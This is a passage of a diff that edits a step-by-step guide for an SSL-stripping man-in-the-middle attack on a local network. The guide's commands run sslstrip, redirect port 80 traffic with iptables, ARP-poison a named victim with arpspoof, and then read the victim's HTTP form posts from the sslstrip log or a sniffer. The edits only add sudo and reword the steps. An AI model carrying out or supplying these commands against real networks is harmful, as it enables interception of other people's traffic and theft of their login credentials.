@@ -62,14 +62,14 @@ The six steps to getting this working (assuming you're running Linux) are:
 
    `sslstrip -l <yourListenPort>`
 
-3) Setup `iptables` to intercept HTTP requests (port 80/tcp) and send them to your sslstrip transparent proxy:
+3) Open a new terminal and setup `iptables` to intercept HTTP requests (port 80/tcp) and send them to your sslstrip transparent proxy:
 
    `sudo iptables -t nat -A PREROUTING -p tcp --dport 80 -j REDIRECT --to-port <yourListenPort>`
 
-5) Run `arpspoof` to redirect all traffic from your victim to the Internet to your machine:
+5) Use `arpspoof` to poison the victim's ARP table so that it sends all traffic to the Internet to your machine instead of its default gateway:
 
-   `arpspoof -i <yourNetworkdDevice> -t <victimIpAddress> <routerIpAddress>`
+   `sudo arpspoof -i <yourNetworkdDevice> -t <victimIpAddress> <routerIpAddress>`
 
-   > `arpspoof` is part of the `dsniff` suite. In Debian-like distros you can install it with `apt update && apt install dsniff`
+   > `arpspoof` is part of the `dsniff` suite. In Debian-like distros you can install it with `sudo apt update && sudo apt install dsniff`
 
-6) Start a network sniffer (e.g. wireshark, tcpdump) or directly look for HTTP posts in the sslstrip log file (`sslstrip.log` by default)
+6) Open a network sniffer (e.g. wireshark, tcpdump) or directly look for HTTP posts in the sslstrip log file (`sslstrip.log` by default)
